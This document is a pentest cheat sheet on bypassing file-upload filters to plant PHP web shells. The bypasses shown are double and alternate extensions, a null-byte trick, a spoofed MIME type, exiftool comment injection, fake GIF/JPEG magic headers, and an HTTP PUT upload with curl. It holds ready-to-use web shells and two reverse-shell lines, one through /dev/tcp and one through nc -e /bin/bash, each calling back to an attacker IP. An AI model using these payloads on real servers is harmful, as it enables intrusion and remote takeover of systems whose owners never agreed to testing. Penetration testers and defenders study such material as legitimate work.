# File Upload Bypass

## File extension

Developers may blacklist specific file extensions and prevent users from uploading files with extensions that are considered dangerous. This can be bypassed by using alternate extensions or even unrelated ones. For example, it might be possible to upload and execute a `.php` file simply by renaming it `file.php.jpg` or `file.PHp`.

Example:&#x20;

* file.php -> 'file.jpg', 'file.php.', 'file.php.jpg' or 'file.php;.jpg'
* file.asp -> 'file.asp;.jpg'&#x20;
* shell.js -> 'shell.jpg'
* shell.php -> shell.phpA.pdf and use hexedit to replace 'A' to 'null byte(0x00)'



**Alternate extensions**

| Type       | Extension                                  |
| ---------- | ------------------------------------------ |
| php        | phtml, .php, .php3, .php4, .php5, and .inc |
| asp        | asp, .aspx                                 |
| perl       | .pl, .pm, .cgi, .lib                       |
| jsp        | .jsp, .jspx, .jsw, .jsv, and .jspf         |
| Coldfusion | .cfm, .cfml, .cfc, .dbm                    |

## MIME type

Blacklisting MIME types is also a method of file upload validation. It may be bypassed by intercepting the POST request on the way to the server and modifying the MIME type.

Normal php MIME type:

```
Content-type: application/x-php
```

Replace with:

```
Content-type: image/jpeg
```

## PHP getimagesize()

For file uploads which validate image size using php `getimagesize()`, it may be possible to execute shellcode by inserting it into the Comment attribute of Image properties and saving it as `file.jpg.php`.

You can do this with gimp or exiftools:

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
mv file.jpg file.php.jpg
#or
mv file.jpg file.jpg.php
```

I'm not sure why some tutorials have the php extension first while others have it second. Try both.

### JPG to PNG Shell

```bash
<?php system($_GET['cmd']); ?>  //shell.php
exiftool "-comment<=shell.php" malicious.png
strings malicious.png | grep system
```

## GIF89a; header

GIF89a is a GIF file header. If uploaded content is being scanned, sometimes the check can be fooled by putting this header item at the top of shellcode:

```bash
GIF89a;
<?php system($_GET['cmd']) ?>

GIF89a:
<?php system('bash -i >& /dev/tcp/10.10.14.5/1234 0>&1 ') ?>
```

### JPEG - '\xff\xd8\xff\xdb'&#x20;

```bash
echo -e '\xff\xd8\xff\xdb' > fake.php.jpg
vim fake.php.jpg
# Add the php script to the jpg file, such as 
# <?php system('nc 10.10.14.19 9090 -e /bin/bash'); ?> 
```

### PUTing File on the Webhost via PUT verb

```bash
curl -X PUT -d '<?php system($_GET["c"]);?>' http://192.168.2.99/shell.php
```
